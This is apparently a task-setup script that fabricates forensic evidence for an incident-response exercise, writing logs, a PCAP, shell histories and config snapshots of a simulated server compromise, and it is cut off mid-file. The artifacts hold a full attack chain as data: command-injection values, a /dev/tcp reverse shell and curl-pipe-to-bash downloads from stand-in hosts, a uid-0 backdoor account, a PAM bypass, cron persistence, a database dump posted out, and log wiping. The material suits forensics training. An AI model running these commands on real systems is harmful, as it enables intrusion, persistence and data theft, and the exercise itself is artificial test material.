#!/usr/bin/env python3
"""Generate forensic evidence artifacts for incident response task."""
import os
import base64
import hashlib
import struct
import shutil

EVIDENCE_ROOT = "/app/evidence"


def mkdirs(*paths):
    for p in paths:
        os.makedirs(os.path.join(EVIDENCE_ROOT, p), exist_ok=True)


def write(subpath, content):
    path = os.path.join(EVIDENCE_ROOT, subpath)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        f.write(content)


def write_bytes(subpath, data):
    path = os.path.join(EVIDENCE_ROOT, subpath)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as f:
        f.write(data)


# ============================================================
# PCAP Generation (raw binary format, no external dependencies)
# ============================================================

def ip_to_bytes(ip_str):
    return bytes(int(x) for x in ip_str.split('.'))


def compute_ip_checksum(header_bytes):
    if len(header_bytes) % 2 == 1:
        header_bytes += b'\x00'
    words = struct.unpack('!%dH' % (len(header_bytes) // 2), header_bytes)
    total = sum(words)
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


def encode_dns_name(name):
    result = b''
    for label in name.split('.'):
        result += bytes([len(label)]) + label.encode()
    result += b'\x00'
    return result


def make_ip_header(src_ip, dst_ip, protocol, payload_len):
    total_len = 20 + payload_len
    header = struct.pack('!BBHHHBBH4s4s',
        0x45, 0, total_len, 0, 0x4000, 64, protocol, 0,
        ip_to_bytes(src_ip), ip_to_bytes(dst_ip),
    )
    checksum = compute_ip_checksum(header)
    header = header[:10] + struct.pack('!H', checksum) + header[12:]
    return header


def make_tcp_header(src_port, dst_port, seq, ack, flags=0x18):
    return struct.pack('!HHIIBBHHH',
        src_port, dst_port, seq, ack,
        (5 << 4), flags, 65535, 0, 0,
    )


def make_udp_header(src_port, dst_port, payload_len):
    length = 8 + payload_len
    return struct.pack('!HHHH', src_port, dst_port, length, 0)


def make_dns_query(query_id, name):
    header = struct.pack('!HHHHHH', query_id, 0x0100, 1, 0, 0, 0)
    question = encode_dns_name(name) + struct.pack('!HH', 1, 1)
    return header + question


def make_packet(src_mac, dst_mac, src_ip, dst_ip, protocol,
                transport_header, payload=b''):
    eth = struct.pack('!6s6sH', dst_mac, src_mac, 0x0800)
    transport_and_payload = transport_header + payload
    ip = make_ip_header(src_ip, dst_ip, protocol, len(transport_and_payload))
    return eth + ip + transport_and_payload


def write_pcap(filepath, packets):
    with open(filepath, 'wb') as f:
        f.write(struct.pack('<IHHiIII',
            0xa1b2c3d4, 2, 4, 0, 0, 65535, 1))
        for ts_sec, ts_usec, data in packets:
            f.write(struct.pack('<IIII',
                ts_sec, ts_usec, len(data), len(data)))
            f.write(data)


def generate_pcap():
    SERVER_IP = "10.0.0.100"
    PRIMARY_C2 = "203.0.113.89"
    SECONDARY_C2 = "192.0.2.100"
    DNS_RESOLVER = "8.8.8.8"

    SERVER_MAC = b'\x00\x0c\x29\xaa\xbb\xcc'
    GW_MAC = b'\x00\x0c\x29\xdd\xee\xff'

    packets = []

    # --- Reverse shell to primary C2 (port 4444) ---
    # TCP SYN
    tcp = make_tcp_header(42198, 4444, 1000, 0, flags=0x02)
    pkt = make_packet(SERVER_MAC, GW_MAC, SERVER_IP, PRIMARY_C2, 6, tcp)
    packets.append((1710468944, 234000, pkt))

    # TCP SYN-ACK
    tcp = make_tcp_header(4444, 42198, 2000, 1001, flags=0x12)
    pkt = make_packet(GW_MAC, SERVER_MAC, PRIMARY_C2, SERVER_IP, 6, tcp)
    packets.append((1710468944, 235000, pkt))

    # TCP ACK
    tcp = make_tcp_header(42198, 4444, 1001, 2001, flags=0x10)
    pkt = make_packet(SERVER_MAC, GW_MAC, SERVER_IP, PRIMARY_C2, 6, tcp)
    packets.append((1710468944, 236000, pkt))

    # TCP data: reverse shell command
    payload = b'/bin/bash -i >& /dev/tcp/203.0.113.89/4444 0>&1\n'
    tcp = make_tcp_header(42198, 4444, 1001, 2001, flags=0x18)
    pkt = make_packet(SERVER_MAC, GW_MAC, SERVER_IP, PRIMARY_C2, 6, tcp, payload)
    packets.append((1710468945, 0, pkt))

    # --- First HTTPS beacon to secondary C2 (port 8443) ---
    beacon_payload_1 = (
        b'POST /beacon HTTP/1.1\r\n'
        b'Host: 192.0.2.100:8443\r\n'
        b'User-Agent: Mozilla/5.0 SystemUpdater/2.1\r\n'
        b'Content-Type: application/octet-stream\r\n'
        b'X-Request-ID: a1b2c3d4\r\n'
        b'\r\n'
        b'\x89\x50\x4e\x47beacon_data_enc_1'
    )

    tcp = make_tcp_header(51200, 8443, 5000, 0, flags=0x02)
    pkt = make_packet(SERVER_MAC, GW_MAC, SERVER_IP, SECONDARY_C2, 6, tcp)
    packets.append((1710469200, 0, pkt))

    tcp = make_tcp_header(8443, 51200, 6000, 5001, flags=0x12)
    pkt = make_packet(GW_MAC, SERVER_MAC, SECONDARY_C2, SERVER_IP, 6, tcp)
    packets.append((1710469200, 1000, pkt))

    tcp = make_tcp_header(51200, 8443, 5001, 6001, flags=0x18)
    pkt = make_packet(SERVER_MAC, GW_MAC, SERVER_IP, SECONDARY_C2, 6, tcp, beacon_payload_1)
    packets.append((1710469200, 2000, pkt))

    # --- Second HTTPS beacon (300 seconds later) ---
    beacon_payload_2 = (
        b'POST /beacon HTTP/1.1\r\n'
        b'Host: 192.0.2.100:8443\r\n'
        b'User-Agent: Mozilla/5.0 SystemUpdater/2.1\r\n'
        b'Content-Type: application/octet-stream\r\n'
        b'X-Request-ID: e5f6a7b8\r\n'
        b'\r\n'
        b'\x89\x50\x4e\x47beacon_data_enc_2'
    )

    tcp = make_tcp_header(51201, 8443, 7000, 0, flags=0x02)
    pkt = make_packet(SERVER_MAC, GW_MAC, SERVER_IP, SECONDARY_C2, 6, tcp)
    packets.append((1710469500, 0, pkt))

    tcp = make_tcp_header(8443, 51201, 8000, 7001, flags=0x12)
    pkt = make_packet(GW_MAC, SERVER_MAC, SECONDARY_C2, SERVER_IP, 6, tcp)
    packets.append((1710469500, 1000, pkt))

    tcp = make_tcp_header(51201, 8443, 7001, 8001, flags=0x18)
    pkt = make_packet(SERVER_MAC, GW_MAC, SERVER_IP, SECONDARY_C2, 6, tcp, beacon_payload_2)
    packets.append((1710469500, 2000, pkt))

    # --- DNS exfiltration queries (between beacons) ---
    dns_queries = [
        "726f6f743a243624.1.exfil.updates-cdn.example.net",
        "726f756e64733d36.2.exfil.updates-cdn.example.net",
        "353533362451386b.3.exfil.updates-cdn.example.net",
        "526a5038244e3178.4.exfil.updates-cdn.example.net",
        "71483568595a324c.5.exfil.updates-cdn.example.net",
        "6632593164523361.6.exfil.updates-cdn.example.net",
    ]

    for i, query in enumerate(dns_queries):
        dns_payload = make_dns_query(0x1000 + i, query)
        udp = make_udp_header(53000 + i, 53, len(dns_payload))
        pkt = make_packet(SERVER_MAC, GW_MAC, SERVER_IP, DNS_RESOLVER, 17,
                          udp, dns_payload)
        packets.append((1710469510 + i, 0, pkt))

    # --- Third HTTPS beacon (another 300 seconds) ---
    beacon_payload_3 = (
        b'POST /beacon HTTP/1.1\r\n'
        b'Host: 192.0.2.100:8443\r\n'
        b'User-Agent: Mozilla/5.0 SystemUpdater/2.1\r\n'
        b'Content-Type: application/octet-stream\r\n'
        b'X-Request-ID: c9d0e1f2\r\n'
        b'\r\n'
        b'\x89\x50\x4e\x47beacon_data_enc_3'
    )

    tcp = make_tcp_header(51202, 8443, 9000, 0, flags=0x02)
    pkt = make_packet(SERVER_MAC, GW_MAC, SERVER_IP, SECONDARY_C2, 6, tcp)
    packets.append((1710469800, 0, pkt))

    tcp = make_tcp_header(8443, 51202, 10000, 9001, flags=0x12)
    pkt = make_packet(GW_MAC, SERVER_MAC, SECONDARY_C2, SERVER_IP, 6, tcp)
    packets.append((1710469800, 1000, pkt))

    tcp = make_tcp_header(51202, 8443, 9001, 10001, flags=0x18)
    pkt = make_packet(SERVER_MAC, GW_MAC, SERVER_IP, SECONDARY_C2, 6, tcp, beacon_payload_3)
    packets.append((1710469800, 2000, pkt))

    # Sort by timestamp
    packets.sort(key=lambda p: (p[0], p[1]))

    write_pcap(os.path.join(EVIDENCE_ROOT, "network/capture.pcap"), packets)


# ============================================================
# Main evidence generation
# ============================================================

def main():
    mkdirs("web", "system", "user_artifacts", "config",
           "network", "malware", "filesystem")

    # === README ===
    write("README.txt", """INCIDENT INVESTIGATION ARTIFACTS
================================
Server: webserver (10.0.0.100)
OS: Ubuntu 22.04 LTS
Role: Web application server (Python/Flask + MySQL)

Incident reported: 2024-03-15 03:00:00 UTC
Artifacts collected: 2024-03-15 03:15:00 UTC

The security team was alerted by the IDS detecting unusual outbound
network traffic from this server. Initial triage confirms a compromise.

Evidence has been organized into the following directories:
- web/            Web server access logs and error logs
- system/         System logs (auth.log, syslog, process listing)
- user_artifacts/ Shell histories, crontabs, SSH authorized_keys
- config/         Snapshots of critical system configuration files
- network/        Network captures (PCAP), connection state, firewall rules
- malware/        Suspicious files recovered from the filesystem
- filesystem/     Filesystem modification timeline

Produce deliverables at /app/report/
""")

    # === WEB ACCESS LOG ===
    normal_uas = [
        '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36"',
        '"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"',
        '"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"',
    ]
    attacker_ua = '"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"'

    normal_entries = [
        ('10.0.0.12', '15/Mar/2024:01:02:14 +0000', 'GET', '/', 200, 3421, '"-"', normal_uas[0]),
        ('10.0.0.25', '15/Mar/2024:01:05:33 +0000', 'GET', '/about', 200, 2187, '"-"', normal_uas[1]),
        ('10.0.0.12', '15/Mar/2024:01:08:45 +0000', 'GET', '/api/v1/status', 200, 84, '"-"', normal_uas[0]),
        ('10.0.0.31', '15/Mar/2024:01:12:07 +0000', 'GET', '/dashboard', 200, 8932, '"-"', normal_uas[2]),
        ('10.0.0.25', '15/Mar/2024:01:15:22 +0000', 'POST', '/api/v1/users/login', 200, 412, '"/login"', normal_uas[1]),
        ('10.0.0.12', '15/Mar/2024:01:22:18 +0000', 'GET', '/api/v1/reports', 200, 15234, '"/dashboard"', normal_uas[0]),
        ('10.0.0.31', '15/Mar/2024:01:28:44 +0000', 'GET', '/static/css/main.css', 200, 4521, '"/"', normal_uas[2]),
        ('10.0.0.31', '15/Mar/2024:01:28:45 +0000', 'GET', '/static/js/app.js', 200, 12843, '"/"', normal_uas[2]),
        ('10.0.0.25', '15/Mar/2024:01:35:11 +0000', 'GET', '/api/v1/health', 200, 52, '"-"', normal_uas[1]),
        ('10.0.0.12', '15/Mar/2024:01:42:33 +0000', 'GET', '/api/v1/diagnostic?host=db-server', 200, 287, '"/admin/tools"', normal_uas[0]),
        ('10.0.0.12', '15/Mar/2024:01:48:19 +0000', 'GET', '/api/v1/diagnostic?host=cache-01', 200, 195, '"/admin/tools"', normal_uas[0]),
        ('10.0.0.25', '15/Mar/2024:01:55:08 +0000', 'GET', '/', 200, 3421, '"-"', normal_uas[1]),
    ]

    scanner_entries = [
        ('45.33.32.156', '15/Mar/2024:01:30:02 +0000', 'GET', '/', 200, 3421, '"-"', '"-"'),
        ('45.33.32.156', '15/Mar/2024:01:30:03 +0000', 'GET', '/nmaplowercheck1710468603', 404, 196, '"-"', '"Mozilla/5.0 (compatible; Nmap Scripting Engine)"'),
        ('45.33.32.156', '15/Mar/2024:01:30:03 +0000', 'GET', '/robots.txt', 404, 196, '"-"', '"Mozilla/5.0 (compatible; Nmap Scripting Engine)"'),
        ('45.33.32.156', '15/Mar/2024:01:30:04 +0000', 'GET', '/sitemap.xml', 404, 196, '"-"', '"Mozilla/5.0 (compatible; Nmap Scripting Engine)"'),
        ('45.33.32.156', '15/Mar/2024:01:30:04 +0000', 'GET', '/.git/HEAD', 404, 196, '"-"', '"Mozilla/5.0 (compatible; Nmap Scripting Engine)"'),
        ('45.33.32.156', '15/Mar/2024:01:30:05 +0000', 'GET', '/admin', 302, 0, '"-"', '"Mozilla/5.0 (compatible; Nmap Scripting Engine)"'),
        ('45.33.32.156', '15/Mar/2024:01:30:05 +0000', 'GET', '/wp-login.php', 404, 196, '"-"', '"Mozilla/5.0 (compatible; Nmap Scripting Engine)"'),
        ('45.33.32.156', '15/Mar/2024:01:30:06 +0000', 'GET', '/phpmyadmin/', 404, 196, '"-"', '"Mozilla/5.0 (compatible; Nmap Scripting Engine)"'),
    ]

    attacker_entries = [
        ('198.51.100.47', '15/Mar/2024:02:14:33 +0000', 'GET', '/', 200, 3421, '"-"', attacker_ua),
        ('198.51.100.47', '15/Mar/2024:02:14:38 +0000', 'GET', '/robots.txt', 404, 196, '"-"', attacker_ua),
        ('198.51.100.47', '15/Mar/2024:02:14:41 +0000', 'GET', '/sitemap.xml', 404, 196, '"-"', attacker_ua),
        ('198.51.100.47', '15/Mar/2024:02:14:45 +0000', 'GET', '/admin', 302, 0, '"-"', attacker_ua),
        ('198.51.100.47', '15/Mar/2024:02:14:48 +0000', 'GET', '/login', 200, 1523, '"-"', attacker_ua),
        ('198.51.100.47', '15/Mar/2024:02:14:52 +0000', 'GET', '/api/v1/status', 200, 84, '"-"', attacker_ua),
        ('198.51.100.47', '15/Mar/2024:02:15:01 +0000', 'GET', '/api/v1/health', 200, 52, '"-"', attacker_ua),
        ('198.51.100.47', '15/Mar/2024:02:15:07 +0000', 'GET', '/api/v1/diagnostic?host=localhost', 200, 287, '"-"', attacker_ua),
        ('198.51.100.47', '15/Mar/2024:02:15:18 +0000', 'GET', '/api/v1/diagnostic?host=localhost%3Bid', 200, 315, '"-"', attacker_ua),
        ('198.51.100.47', '15/Mar/2024:02:15:29 +0000', 'GET', '/api/v1/diagnostic?host=localhost%3Bcat%20/etc/passwd', 200, 1842, '"-"', attacker_ua),
        ('198.51.100.47', '15/Mar/2024:02:15:35 +0000', 'GET', '/api/v1/diagnostic?host=localhost%3Buname%20-a', 200, 342, '"-"', attacker_ua),
        ('198.51.100.47', '15/Mar/2024:02:15:42 +0000', 'POST', '/api/v1/diagnostic', 200, 0, '"-"', attacker_ua),
    ]

    post_attack_normal = [
        ('10.0.0.25', '15/Mar/2024:02:18:33 +0000', 'GET', '/', 200, 3421, '"-"', normal_uas[1]),
        ('10.0.0.12', '15/Mar/2024:02:25:44 +0000', 'GET', '/api/v1/reports', 200, 15234, '"/dashboard"', normal_uas[0]),
        ('10.0.0.31', '15/Mar/2024:02:32:12 +0000', 'GET', '/dashboard', 200, 8932, '"-"', normal_uas[2]),
        ('10.0.0.12', '15/Mar/2024:02:41:08 +0000', 'GET', '/api/v1/status', 200, 84, '"-"', normal_uas[0]),
        ('10.0.0.25', '15/Mar/2024:02:48:55 +0000', 'POST', '/api/v1/users/login', 200, 412, '"/login"', normal_uas[1]),
        ('10.0.0.31', '15/Mar/2024:02:55:22 +0000', 'GET', '/', 200, 3421, '"-"', normal_uas[2]),
    ]

    access_lines = []
    all_entries = normal_entries + scanner_entries + attacker_entries + post_attack_normal
    for ip, ts, method, path, status, size, ref, ua in all_entries:
        access_lines.append(
            f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {status} {size} {ref} {ua}')
    access_lines.sort(key=lambda l: l.split("[")[1].split("]")[0])
    write("web/access.log", "\n".join(access_lines) + "\n")

    # === WEB ERROR LOG ===
    write("web/error.log", """[Fri Mar 15 01:00:02.481923 2024] [mpm_event:notice] [pid 1102] AH00489: Apache/2.4.52 (Ubuntu) configured -- resuming normal operations
[Fri Mar 15 01:00:02.482105 2024] [core:notice] [pid 1102] AH00094: Command line: '/usr/sbin/apache2'
[Fri Mar 15 02:15:18.234112 2024] [cgi:error] [pid 1205] [client 198.51.100.47:49821] End of script output before headers: diagnostic.py
[Fri Mar 15 02:15:29.891023 2024] [cgi:error] [pid 1205] [client 198.51.100.47:49823] End of script output before headers: diagnostic.py
[Fri Mar 15 02:15:42.102445 2024] [cgi:error] [pid 1205] [client 198.51.100.47:49825] script '/var/www/html/api/v1/diagnostic.py' stderr: subprocess.CalledProcessError
""")

    # === AUTH LOG ===
    auth_lines = []
    auth_lines.extend([
        "Mar 15 00:00:12 webserver systemd-logind[682]: New session 14 of user root.",
        "Mar 15 00:00:12 webserver sshd[1501]: Accepted publickey for admin from 10.0.0.5 port 52341 ssh2",
        "Mar 15 00:00:12 webserver sshd[1501]: pam_unix(sshd:session): session opened for user admin(uid=1000) by admin(uid=0)",
        "Mar 15 00:15:33 webserver sshd[1501]: pam_unix(sshd:session): session closed for user admin",
        "Mar 15 00:15:33 webserver systemd-logind[682]: Session 14 logged out. Waiting for processes to exit.",
        "Mar 15 00:15:34 webserver systemd-logind[682]: Removed session 14.",
    ])

    bruteforce_users = ["admin", "test", "user", "root", "deploy", "ubuntu", "vagrant",
                        "oracle", "postgres", "mysql", "ftpuser", "backup", "git",
                        "jenkins", "ansible", "nagios", "tomcat", "www", "mail"]
    port_start = 54321
    for i, u in enumerate(bruteforce_users):
        ts_min = 45 + (i * 10 // 20)
        ts_sec = (i * 3) % 60
        auth_lines.append(
            f"Mar 15 01:{ts_min:02d}:{ts_sec:02d} webserver sshd[{1842+i}]: "
            f"Failed password for invalid user {u} from 185.220.101.42 port {port_start+i} ssh2"
        )
    auth_lines.append("Mar 15 01:55:15 webserver sshd[1870]: Connection closed by 185.220.101.42 port 54340 [preauth]")

    auth_lines.extend([
        "Mar 15 02:00:05 webserver sshd[2001]: Accepted publickey for admin from 10.0.0.5 port 52890 ssh2",
        "Mar 15 02:00:05 webserver sshd[2001]: pam_unix(sshd:session): session opened for user admin(uid=1000) by admin(uid=0)",
        "Mar 15 02:05:12 webserver sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl status apache2",
        "Mar 15 02:08:33 webserver sshd[2001]: pam_unix(sshd:session): session closed for user admin",
    ])

    auth_lines.extend([
        "Mar 15 02:18:55 webserver su[2734]: Successful su for root by www-data",
        "Mar 15 02:18:55 webserver su[2734]: + /dev/pts/2 www-data:root",
        "Mar 15 02:18:55 webserver su[2734]: pam_unix(su:session): session opened for user root(uid=0) by www-data(uid=33)",
    ])

    auth_lines.extend([
        "Mar 15 02:35:22 webserver sshd[3156]: Accepted publickey for root from 198.51.100.47 port 49832 ssh2",
        "Mar 15 02:35:22 webserver sshd[3156]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)",
        "Mar 15 02:36:15 webserver sshd[3156]: pam_unix(sshd:session): session closed for user root",
    ])

    auth_lines.extend([
        "Mar 15 02:38:08 webserver sshd[3198]: Accepted password for svc_backup from 198.51.100.47 port 49901 ssh2",
        "Mar 15 02:38:08 webserver sshd[3198]: pam_unix(sshd:session): session opened for user svc_backup(uid=0) by (uid=0)",
        "Mar 15 02:38:42 webserver sshd[3198]: pam_unix(sshd:session): session closed for user svc_backup",
    ])

    auth_lines.sort(key=lambda l: l[:15])
    write("system/auth.log", "\n".join(auth_lines) + "\n")

    # === SYSLOG ===
    syslog_lines = []
    syslog_lines.extend([
        "Mar 15 00:00:01 webserver systemd[1]: Started Daily apt download activities.",
        "Mar 15 00:00:01 webserver CRON[1401]: (root) CMD (/usr/bin/apt-get update -qq)",
        "Mar 15 00:17:01 webserver CRON[1456]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)",
        "Mar 15 01:00:02 webserver apache2[1102]: Server configured, resuming normal operations",
        "Mar 15 01:17:01 webserver CRON[1623]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)",
        "Mar 15 02:00:01 webserver systemd[1]: Starting logrotate.service - Rotate log files...",
        "Mar 15 02:00:02 webserver systemd[1]: logrotate.service: Deactivated successfully.",
        "Mar 15 02:00:02 webserver systemd[1]: Finished logrotate.service - Rotate log files.",
    ])

    syslog_lines.extend([
        "Mar 15 02:15:07 webserver flask_app[1205]: INFO diagnostic request: host=localhost from 198.51.100.47",
        "Mar 15 02:15:18 webserver flask_app[1205]: INFO diagnostic request: host=localhost;id from 198.51.100.47",
        "Mar 15 02:15:29 webserver flask_app[1205]: INFO diagnostic request: host=localhost;cat /etc/passwd from 198.51.100.47",
        "Mar 15 02:15:35 webserver flask_app[1205]: INFO diagnostic request: host=localhost;uname -a from 198.51.100.47",
        "Mar 15 02:15:42 webserver flask_app[1205]: WARNING diagnostic POST request from 198.51.100.47: host=localhost;curl http://203.0.113.89:8080/s.sh|bash",
    ])

    syslog_lines.extend([
        "Mar 15 02:15:44 webserver kernel: [42978.234112] audit: type=1400 msg=audit(1710468944.234:89): apparmor=\"ALLOWED\" operation=\"exec\" profile=\"/usr/sbin/apache2\" name=\"/bin/bash\" pid=2501",
        "Mar 15 02:18:55 webserver kernel: [43169.891023] audit: type=1100 msg=audit(1710469135.891:92): pid=2734 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"root\" exe=\"/bin/su\"'",
    ])

    syslog_lines.extend([
        "Mar 15 02:20:01 webserver CRON[2891]: (root) CMD (/usr/local/bin/.cache_update >/dev/null 2>&1)",
        "Mar 15 02:25:01 webserver CRON[3012]: (root) CMD (/usr/local/bin/.cache_update >/dev/null 2>&1)",
        "Mar 15 02:30:01 webserver CRON[3089]: (root) CMD (/usr/local/bin/.cache_update >/dev/null 2>&1)",
        "Mar 15 02:35:01 webserver CRON[3145]: (root) CMD (/usr/local/bin/.cache_update >/dev/null 2>&1)",
    ])

    syslog_lines.append("Mar 15 02:17:01 webserver CRON[2802]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)")
    syslog_lines.append("Mar 15 02:15:44 webserver kernel: [42978.235001] TCP: connect from 10.0.0.100:42198 to 203.0.113.89:4444")

    syslog_lines.sort(key=lambda l: l[:15])
    write("system/syslog", "\n".join(syslog_lines) + "\n")

    # === BASH HISTORY - www-data ===
    write("user_artifacts/bash_history_www-data", """id
whoami
uname -a
cat /etc/os-release
cat /etc/passwd
ls -la /home/
cat /etc/crontab
ps aux
netstat -tlnp
find / -perm -u=s -type f 2>/dev/null
ls -la /usr/bin/pkexec
dpkg -l | grep polkit
curl http://203.0.113.89:8080/pwnkit -o /tmp/.pwnkit
chmod +x /tmp/.pwnkit
/tmp/.pwnkit
""")

    # === BASH HISTORY - root (post-privesc) ===
    write("user_artifacts/bash_history_root", """id
whoami
cat /etc/shadow
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash svc_backup
echo 'svc_backup:$6$rKz8JvP3$W9xNqH5mZL2fY1dR3aK7gT0bV4jU8cE6wX2nM5pQ9sI7oA3lF0hG4dS1kJ6yR8tB2vN5mW7eP9qZ4xC3aL1f:19797:0:99999:7:::' >> /etc/shadow
mkdir -p /root/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7f8a9X2kZp4M3nN1jJ5rR4tT8wW2eE6yY0uU4iI3oO9pP1aA2sS5dD7fF8gG4hH6jJ0kK9lL3zZ1xX2cC4vV7bB0nN5mM8qQ6wW3eE1rR9tT0yY4uU2iI7oO6pP8aA3sS1dD0fF5gG9hH2jJ4kK7lL6zZ8xX3cC1vV0bB2nN9mM root@c2server' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
echo '#!/bin/bash' > /usr/local/bin/.cache_update
echo 'bash -i >& /dev/tcp/203.0.113.89/4444 0>&1' >> /usr/local/bin/.cache_update
chmod +x /usr/local/bin/.cache_update
(crontab -l 2>/dev/null; echo '*/5 * * * * /usr/local/bin/.cache_update >/dev/null 2>&1') | crontab -
sed -i '2i auth sufficient pam_permit.so' /etc/pam.d/common-auth
mysqldump -u root --databases app_db > /tmp/.db_dump.sql
curl -s -X POST -d @/tmp/.db_dump.sql http://203.0.113.89:8080/collect
rm -f /tmp/.pwnkit /tmp/.db_dump.sql
history -c
echo "" > /var/log/auth.log.1
""")

    # === ROOT CRONTAB ===
    write("user_artifacts/crontab_root.bak", """# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.XXXX installed on Fri Mar 15 02:22:08 2024)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# m h  dom mon dow   command
0 */6 * * * /usr/bin/apt-get update -qq
30 2 * * 0 /usr/local/bin/weekly_backup.sh
*/5 * * * * /usr/local/bin/.cache_update >/dev/null 2>&1
""")

    # === ROOT AUTHORIZED KEYS ===
    write("user_artifacts/authorized_keys_root.bak", """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTm4q8K3bN1rH5wV9yJ2xL0pR7fE8tG6uS3nI4oK9mA2dW5cF0jX7hZ1gB4vQ8lY6sU3pN0eR5tW2kM9iA7oJ4fD1hG6sL8xC0vB3nN5mM2qQ7wE4rR1tT6yY9uU0iI8oO3pP5aA2sS7dD4fF9gG1hH6jJ3kK8lL5zZ0xX2cC4vV7bB admin@webserver
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7f8a9X2kZp4M3nN1jJ5rR4tT8wW2eE6yY0uU4iI3oO9pP1aA2sS5dD7fF8gG4hH6jJ0kK9lL3zZ1xX2cC4vV7bB0nN5mM8qQ6wW3eE1rR9tT0yY4uU2iI7oO6pP8aA3sS1dD0fF5gG9hH2jJ4kK7lL6zZ8xX3cC1vV0bB2nN9mM root@c2server
""")

    # === /etc/passwd snapshot ===
    write("config/passwd.snapshot", """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
admin:x:1000:1000:System Administrator,,,:/home/admin:/bin/bash
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
svc_backup:x:0:0::/root:/bin/bash
""")

    # === /etc/shadow snapshot ===
    write("config/shadow.snapshot", """root:$6$rounds=65536$Qm8kRvX3$hN1wZ5pY4tG7eR2aS9kJ0fD3lM6bV8cU1xW4nQ5oI7gA2hF0sL9dK3jY6rT8bE5vN1mW7eP4qZ0xC3aL6fG:19797:0:99999:7:::
daemon:*:19547:0:99999:7:::
bin:*:19547:0:99999:7:::
sys:*:19547:0:99999:7:::
sync:*:19547:0:99999:7:::
games:*:19547:0:99999:7:::
man:*:19547:0:99999:7:::
lp:*:19547:0:99999:7:::
mail:*:19547:0:99999:7:::
news:*:19547:0:99999:7:::
uucp:*:19547:0:99999:7:::
proxy:*:19547:0:99999:7:::
www-data:*:19547:0:99999:7:::
backup:*:19547:0:99999:7:::
list:*:19547:0:99999:7:::
irc:*:19547:0:99999:7:::
nobody:*:19547:0:99999:7:::
_apt:*:19547:0:99999:7:::
systemd-network:!!:19764::::::
systemd-resolve:!!:19764::::::
messagebus:!!:19764::::::
systemd-timesync:!!:19764::::::
sshd:!!:19764::::::
admin:$6$rounds=65536$aB2cD3eF$gH4iJ5kL6mN7oP8qR9sT0uV1wX2yZ3aB4cD5eF6gH7iJ8kL9mN0oP1qR2sT3uV4wX5yZ6aB7cD8eF9gH0i:19764:0:99999:7:::
mysql:!:19764:0:99999:7:::
svc_backup:$6$rKz8JvP3$W9xNqH5mZL2fY1dR3aK7gT0bV4jU8cE6wX2nM5pQ9sI7oA3lF0hG4dS1kJ6yR8tB2vN5mW7eP9qZ4xC3aL1f:19797:0:99999:7:::
""")

    # === PAM common-auth snapshot ===
    write("config/common-auth.snapshot", """#
# /etc/pam.d/common-auth - authentication settings common to all services
#
# This file is included from other service-specific PAM config files,
# and should contain a list of the authentication modules that define
# the central authentication scheme for use on the system
# (e.g., /etc/shadow, LDAP, Kerberos, etc.)

# here are the per-package modules (the "Primary" block)
auth sufficient pam_permit.so
auth\t[success=1 default=ignore]\tpam_unix.so nullok
# here's the fallback if no module succeeds
auth\trequisite\t\t\tpam_deny.so
# prime the stack with a positive return value if there isn't one already;
# this averts an pointless error message
auth\trequired\t\t\tpam_permit.so
# and here are more per-package modules (the "Additional" block)
auth\toptional\t\t\tpam_cap.so
# end of pam-auth-update config
""")

    # === SUDOERS snapshot ===
    write("config/sudoers.snapshot", """#
# This file MUST be edited with 'visudo' as root.
#
Defaults\tenv_reset
Defaults\tmail_badpass
Defaults\tsecure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification
# User alias specification
# Cmnd alias specification

# User privilege specification
root\tALL=(ALL:ALL) ALL

